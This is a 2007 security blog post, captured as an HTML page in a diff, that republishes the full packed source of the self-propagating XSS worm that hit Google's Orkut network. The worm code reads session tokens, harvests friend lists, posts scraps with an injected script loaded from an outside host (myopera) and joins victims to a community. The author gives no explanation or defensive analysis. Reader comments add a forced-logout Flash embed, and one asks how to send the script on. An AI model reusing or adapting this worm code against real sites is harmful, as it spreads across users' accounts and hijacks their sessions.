@@ -1,0 +1,60 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>The Orkut XSS Worm</title><meta name="description" content="Yep, Orkut, Google's Social Network, was hit by a XSS worm, the source of which you will be able to find at the bottom of this post. To be honest with you, it was about time. The trend for infecting social networks with Web2.0 malware will continue to increase during the following years. This is for sure! The simple fact is that social networks collect a lot of personal information which attackers can easily harvest for their own benefit."><meta property="name" content="The Orkut XSS Worm"><meta itemprop="name" content="The Orkut XSS Worm"><meta property="description" content="Yep, Orkut, Google's Social Network, was hit by a XSS worm, the source of which you will be able to find at the bottom of this post. To be honest with you, it was about time. The trend for infecting social networks with Web2.0 malware will continue to increase during the following years. This is for sure! The simple fact is that social networks collect a lot of personal information which attackers can easily harvest for their own benefit."><meta itemprop="description" content="Yep, Orkut, Google's Social Network, was hit by a XSS worm, the source of which you will be able to find at the bottom of this post. To be honest with you, it was about time. The trend for infecting social networks with Web2.0 malware will continue to increase during the following years. This is for sure! The simple fact is that social networks collect a lot of personal information which attackers can easily harvest for their own benefit."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fthe-orkut-xss-worm%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fthe-orkut-xss-worm%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/the-orkut-xss-worm/"><meta property="og:title" content="The Orkut XSS Worm"><meta property="og:description" content="Yep, Orkut, Google's Social Network, was hit by a XSS worm, the source of which you will be able to find at the bottom of this post. To be honest with you, it was about time. The trend for infecting social networks with Web2.0 malware will continue to increase during the following years. This is for sure! The simple fact is that social networks collect a lot of personal information which attackers can easily harvest for their own benefit."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fthe-orkut-xss-worm%2F?w=1024"><meta name="twitter:title" content="The Orkut XSS Worm"><meta name="twitter:description" content="Yep, Orkut, Google's Social Network, was hit by a XSS worm, the source of which you will be able to find at the bottom of this post. To be honest with you, it was about time. The trend for infecting social networks with Web2.0 malware will continue to increase during the following years. This is for sure! The simple fact is that social networks collect a lot of personal information which attackers can easily harvest for their own benefit."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fthe-orkut-xss-worm%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">The Orkut XSS Worm</h1><div>Wed, 19 Dec 2007 11:15:27 GMT</div><div id="post-content"><p>Yep, Orkut, Google&#39;s Social Network, was hit by a XSS worm, the source of which you will be able to find at the bottom of this post. To be honest with you, it was about time. The trend for infecting social networks with Web2.0 malware will continue to increase during the following years. This is for sure! The simple fact is that social networks collect a lot of personal information which attackers can easily harvest for their own benefit.</p>
+<p>The code is fairly simple and should be no brainier for you to find out what it does. So, this is the reason why I will skip the explanation step. The pre-processed details can be found out at <a href="http://antrix.net/journal/techtalk/orkut_xss.html">antrix.net</a> website.</p>
+<pre><code class="language-javascript">function $(p,a,c,k,e,d) {
+    e=function(c) {
+        return(c&lt;a?"":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))
+    };
+    if(!''.replace(/^/,String)){
+        while(c--){d[e(c)]=k[c]||e(c)}
+        k=[function(e){return d[e]}];
+        e=function(){return'\\w+'};
+        c=1
+    };
+    while(c--){
+        if(k[c]){
+            p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])
+        }
+    }
+    return p
+};
+setTimeout(
+    $('5 j=0;5 q=1q["2o.H"];5 E=1q["2p.K.27"];7 B(){Z{b i 14("29.1l")}
+    L(e){};Z{b i 14("2b.1l")}L(e){};Z{b i 2l()}L(e){};b J};
+    7 W(g,P,m,c,9,U){5 1m=g+"="+19(P)+(m?"; m="+m.2f():"")+(c?"; c="+c:"")+(9?"; 9="+9:"")+(U?"; U":"");
+    8.y=1m};7 v(g){5 l=8.y;5 A=g+"=";5 h=l.S("; "+A);6(h==-1){h=l.S(A);6(h!=0){b 2h}}16{h+=2};
+    5 u=8.y.S(";",h);6(u==-1){u=l.M};b 2j(l.2m(h+A.M,u))};
+    7 26(g,c,9){6(v(g)){8.y=g+"="+(c?"; c="+c:"")+(9?"; 9="+9:"")+"; m=1u, 1i-1v-1x 1g:1g:1i 1y";1U.1z(0)}};
+    7 G(){5 3=B();6(3){3.R("1A","o://k.w.p/1B.z",C);3.a(J);3.Y=7(){6(3.X==4){6(3.1a==1c){5 1r=3.1Q;5 t=8.1n("t");
+    t.1D=1r;5 f=t.D("f").O(0);6(f){f.1M(f.D("1F").O(0));f.1G("1H","N");f.1J.1K="1L";8.1N.1f(f);V()}}16{G()}}};
+    3.a(J)}};7 T(){5 a="H="+n(q)+"&amp;K="+n(E)+"&amp;15.1O";5 3=B();3.R(\'q\',\'o://k.w.p/1P.z?1R=1S\',C);
+    3.12(\'10-1e\',\'Q/x-k-17-1b\');3.a(a);3.Y=7(){6(3.X==4){6(3.1a!=1c){T();b};G()}}};
+    7 V(){6(j==8.18("N").M){b};
+    5 I="1V 1W 1X... 1Y 1Z 20 21 22 23 24&lt;1k/&gt;[1j]25 "+i F()+"[/1j]&lt;1k/&gt;&lt;13 1o=\\"o://k.w.p/28.z\\" 2a=\\"Q/x-2c-2d\\" 2e=\\"2g\');
+    r=8.1n(\'r\');r.1o=\'o://1p.2k.p/2n/1p/1s.1t\';8.D(\'1w\')[0].1f(r);19(\'\\" 1C=\\"1\\" 1E=\\"1\\"&gt;&lt;/13&gt;";
+    5 a="15.1I=1&amp;H="+n(q)+"&amp;I="+n(I)+"&amp;K="+n(E)+"&amp;1T="+8.18("N").O(j).P;5 3=B();
+    3.R("q","o://k.w.p/2i.z",C);3.12("10-1e","Q/x-k-17-1b;");
+    3.a(a);3.Y=7(){6(3.X==4){j++;5 d=i F;d.1d(d.1h()+11);W(\'s\',j,d);V()}}};
+    6(!v(\'s\')){5 d=i F;d.1d(d.1h()+11);W(\'s\',\'0\',d)};j=v(\'s\');T();
+    ',62,150,'|||xml||var|if|function|document|domain|send|return|path|wDate||select|name|begin|new|index|
+    www|dc|expires|encodeURIComponent|http|com|POST|script|wormdoorkut|div|end|getCookie|orkut||cookie|aspx
+    |prefix|createXMLHttpRequest|true|getElementsByTagName|SIG|Date|loadFriends|POST_TOKEN|scrapText|null|
+    signature|catch|length|selectedList|item|value|application|open|indexOf|cmm_join|secure|sendScrap|setCookie|
+    readyState|onreadystatechange|try|Content|86400|setRequestHeader|embed|ActiveXObject|Action|else|form|
+    getElementById|escape|status|urlencoded|200|setTime|Type|appendChild|00|getTime|01|silver|br|XMLHTTP|curCookie|
+    createElement|src|files|JSHDF|xmlr|virus|js|Thu|Jan|head|70|GMT|go|GET|Compose|width|innerHTML|height|option|
+    setAttribute|id|submit|style|display|none|removeChild|body|join|CommunityJoin|responseText|cmm|44001818|toUserId|
+    history|2008|vem|ai|que|ele|comece|mto|bem|para|vc|RL|deleteCookie|raw|LoL|Msxml2|type|Microsoft|shockwave|flash|
+    wmode|toGMTString|transparent|false|Scrapbook|unescape|myopera
+    |XMLHttpRequest|substring|virusdoorkut|CGI|Page'.split('|'),0,{}),1
+);
+author="Rodrigo Lacerda"</code></pre>
+<p>So, there you go! Even if XSS is the lamest for of attack, you cannot deny its effectiveness.</p>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Tarun"><span>Tarun</span><div class="post-comment-content">Great Effort By yOU !!!tHX</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Psychlo"><span>Psychlo</span><div class="post-comment-content">brazilians are the best asuhs (just kiddin'..).. actually this was corrected today 19/12/07 and it doesn't infected really because the "virus" just added people into a community... the possibilities of joinning vulnerabilities could cause a bigger damage...
+
+but now it's already fixed..</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Psychlo"><span>Psychlo</span><div class="post-comment-content">the blog.. cut my code.. sry...</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">well, the worm wasn't anything special and I guess tis is the good thing. :) if it was armed with some exploits simple channeled via MPack or WebAttacker, the casualties would have been a lot more.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Raaka!"><span>Raaka!</span><div class="post-comment-content"><pre><code>var flashWriter = new _SWFObject('http://www.orkut.com/GLogin.aspx?cmd=logout', '77299695', '300', '300', '9', '#FFFFFF', 'autohigh', '', '', '77299695'); flashWriter._addParam('wmode', 'transparent'); flashWriter._addParam('allowNetworking', 'internal'); flashWriter._addParam('allowScriptAccess', 'never'); flashWriter._setAttribute('style', ''); flashWriter._write('flashDiv77299695');</code></pre>
+
+seen this ?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ix"><span>Ix</span><div class="post-comment-content">Almost 660 thousand hit by this, unless some people joined the group without being infected... Anyone know how long it was out in the wild before it was fixed? I've only heard that it's been fixed but nothing on how long it took, and it would be nice to have a time amount to compare to the 659154 members.
+
+Guess the good news is it was just a proof and not an actual attack, else life would be bad for those members right now, and nothing can wreck the holiday season like identity theft and its other related problems.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ryan"><span>Ryan</span><div class="post-comment-content">that code is packed with dean edwards javascript packer. if anyone needs any help deciphering what it does I wrote an article on defeating that packer, you can find it here: 
+
+http://yaisb.blogspot.com/2006/10/defeating-dean-edwards-javascript.html</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="cristiano"><span>cristiano</span><div class="post-comment-content"><pre><code>var flashWriter = new _SWFObject('http://www.orkut.com/GLogin.aspx?cmd=logout', '77299695', '300', '300', '9', '#FFFFFF', 'autohigh', '', '', '77299695'); flashWriter._addParam('wmode', 'transparent'); flashWriter._addParam('allowNetworking', 'internal'); flashWriter._addParam('allowScriptAccess', 'never'); flashWriter._setAttribute('style', ''); flashWriter._write('flashDiv77299695');</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="hanush"><span>hanush</span><div class="post-comment-content">How can i put ths script as scrap. i just got ths as a scrap in orkut from a frnd of mine.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
